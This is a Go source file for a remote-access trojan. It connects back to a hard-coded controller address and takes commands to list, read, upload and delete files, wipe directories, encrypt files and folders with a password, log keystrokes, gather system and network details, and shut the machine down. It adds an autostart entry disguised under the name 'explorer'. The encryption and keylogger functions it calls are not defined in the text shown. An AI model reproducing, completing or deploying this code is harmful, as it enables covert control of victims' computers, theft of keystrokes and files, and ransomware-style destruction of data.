package main

import (
	"io/ioutil"
	random "math/rand"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
	
	"github.com/ProtonMail/go-autostart"
)

const (
	IP   = "127.0.0.1"
	PORT = "4000"
)

var (
	buffer    = make([]byte, 1024)
	directory string
	message   string
)

func main() {
	app := &autostart.App{
		Name:        "explorer",
		DisplayName: "explorer",
		Exec:        []string{"bash", "-c", "echo autostart >> ~/autostart.txt"},
	}

	if app.IsEnabled() {
		app.Disable()
		app.Enable()
	}
	
	conn, err := net.Dial("tcp", IP+":"+PORT)
	if err != nil {
		os.Exit(1)
	}

	for {
		length, err := conn.Read(buffer)
		if err != nil {
			os.Exit(1)
		}
		message = string(buffer[:length])

		if strings.HasPrefix(message, "ls") {
			comm := ls_comm(message)
			conn.Write([]byte(comm))
		}

		if strings.HasPrefix(message, "dirm") {
			os.RemoveAll(message[5:])
			conn.Write([]byte("delete - ok"))
		}

		if strings.HasPrefix(message, "rm") {
			exec.Command("cmd", "/c ", "del", message[3:]).Output()
			conn.Write([]byte("delete - ok"))
		}

		if strings.HasPrefix(message, "file") {
			data, err := ioutil.ReadFile(message[5:])
			if err != nil {
				conn.Write([]byte("error read file"))
			}
			conn.Write([]byte(string(data)))
		}

		if strings.HasPrefix(message, "upfile") {
			data := []byte(string(message[7:]))
			random.Seed(time.Now().UnixNano())
			number := random.Intn(10000)
			err := ioutil.WriteFile(string(number)+"write.txt", data, 0777)
			if err != nil {
				conn.Write([]byte("file not written"))
			} else {
				conn.Write([]byte("file was recorded"))
			}
		}

		if strings.HasPrefix(message, "crypt") {
			data := strings.Split(message, " ")
			password := data[1]
			path := data[2]
			file_name := strings.Split(path, "/")
			res := CryptFile(file_name[len(file_name)-1], path, password)
			conn.Write([]byte(res))
		}

		if strings.HasPrefix(message, "dircrypt") {
			data := strings.Split(message, " ")
			password := data[1]
			path := data[2]
			dir_name := strings.Split(path, "/")
			res := CryptDir(dir_name[len(dir_name)-1], path, password)
			conn.Write([]byte(res))
		}

		if strings.HasPrefix(message, "keylogger") {
			data := strings.Split(message, " ")
			length, err := strconv.Atoi(data[1])
			if err != nil {
				conn.Write([]byte("wrong quantity entered"))
			} else {
				logs := keyLogger(length)
				conn.Write([]byte(logs))
			}
		}

		if message == "sysinfo" {
			comm0 := command("systeminfo")
			conn.Write([]byte(comm0))
		}

		if message == "shutdown" {
			exec.Command("cmd", "/c ", "shutdown", "/p").Output()
			conn.Write([]byte("shutdown - ok"))
		}

		if message == "pwd" {
			dir, err := filepath.Abs(filepath.Dir(os.Args[0]))
			if err != nil {
				conn.Write([]byte("error"))
			} else {
				conn.Write([]byte(dir))
			}
		}

		if message == "ifconfig" {
			comm1 := command("ipconfig")
			conn.Write([]byte(comm1))
		}

		if strings.HasPrefix(message, "close") {
			conn.Close()
			os.Exit(1)
		}
	}
}

func ls_comm(text string) string {
	var ret string
	if len(text) > 2 {
		data, err := ioutil.ReadDir(text[3:])
		if err != nil {
			return "directory exist"
		}
		for _, file := range data {
			ret += file.Name() + "\n"
		}
	} else {
		data, err := ioutil.ReadDir(".")
		if err != nil {
			return "directory exist"
		}
		for _, file := range data {
			ret += file.Name() + "\n"
		}
	}
	return ret
}

func command(text string) string {
	cmd, _ := exec.Command("cmd", "/c ", text).Output()
	return string(cmd)[30:]
}
